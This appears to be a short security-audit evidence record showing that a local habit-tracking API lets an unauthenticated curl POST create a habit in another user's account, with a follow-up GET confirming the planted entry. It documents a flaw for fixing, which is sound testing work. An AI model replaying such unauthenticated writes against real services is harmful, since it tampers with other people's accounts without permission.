Unauthenticated write into testUser2's account (no credentials supplied)
Captured 2026-10-10

$ curl -i -X POST http://127.0.0.1:8000/habits -H "Content-Type: application/json" \
  -d '{"username":"testUser2","title":"F02-planted","description":""}'

HTTP/1.1 201 Created
content-type: application/json

{"message":"Habit created successfully","habit":{"id":"c813a02e-ebf0-4969-9ed3-9be3267c2f62","username":"testUser2","title":"F02-planted","description":"","_id":"6aca774ac8f60271923c8aa0"}}

--- Verification: GET /habits?username=testUser2 (also unauthenticated) ---

$ curl -i "http://127.0.0.1:8000/habits?username=testUser2"

HTTP/1.1 200 OK
content-type: application/json

[...,{"_id":"6aca774ac8f60271923c8aa0","id":"c813a02e-ebf0-4969-9ed3-9be3267c2f62","username":"testUser2","title":"F02-planted","description":""}]

F02-planted habit appears in testUser2's list, planted by a request that carried no
credentials of any kind.
